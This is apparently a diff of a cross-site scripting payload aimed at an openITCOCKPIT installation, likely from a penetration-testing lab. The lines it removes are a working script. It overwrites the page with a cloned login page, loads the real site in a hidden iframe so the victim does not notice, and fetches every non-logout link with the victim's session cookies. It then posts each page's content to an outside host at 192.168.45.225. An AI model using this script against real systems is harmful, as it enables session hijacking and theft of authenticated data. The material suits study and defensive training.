@@ -1,4 +1,3 @@
-body = `
 <html lang=\"en\"><head>
     <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">
     <title>
@@ -102,56 +101,3 @@ body = `
 </div>
 
 <iframe style=\"display:none\" src=\"https://openitcockpit\" width=\"100%\" height=\"100%\"></iframe></body></html>
-`
-
-document.getElementsByTagName("html")[0].innerHTML = body
-
-validURL = (url) => {
-    if (url.includes('logout') || url.includes('log-out') || url.includes('signout') || url.includes('sign-out')){
-        return false;
-    }
-    return true;
-}
-
-actions = () => {
-    setTimeout(() => {
-        var allA = iframe.contentDocument.getElementsByTagName("a");
-        var allHrefs = [];
-        for (var i=0;i<allA.length; i++){ // Adds all links into array
-            allHrefs.push(allA[i].href);
-        }
-        var uniqueHrefs = _.unique(allHrefs);
-        var validHrefs = [];
-        for (var i=0; i<uniqueHrefs.length; i++){
-            if (validURL(uniqueHrefs[i])){
-                validHrefs.push(uniqueHrefs[i]);
-            }
-        }
-        // Run the request asynchronously to ensure it won't freeze up user's browser
-        validHrefs.forEach(href => {
-            console.log("Attempting " + href)
-            fetch(href, {
-                "credentials": "include",
-                "method": "GET"
-            }).then((response) => {
-                return response.text();
-            }).then((text) => {
-                fetch("https://192.168.45.225/save_page", {
-                    body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text),
-                    headers: {"Content-Type": "application/x-www-form-urlencoded"},
-                    method: "POST"
-                });
-            });
-        });
-    }, 5000); // Leave time for page to load
-}
-
-var iframe = document.createElement('iframe');
-iframe.setAttribute("style", "display:none"); // Don't want victim to see page loading
-iframe.onload=actions;
-iframe.width="100%";
-iframe.height="100%";
-iframe.src="https://openitcockpit"
-
-body = document.getElementsByTagName('body')[0];
-body.appendChild(iframe);
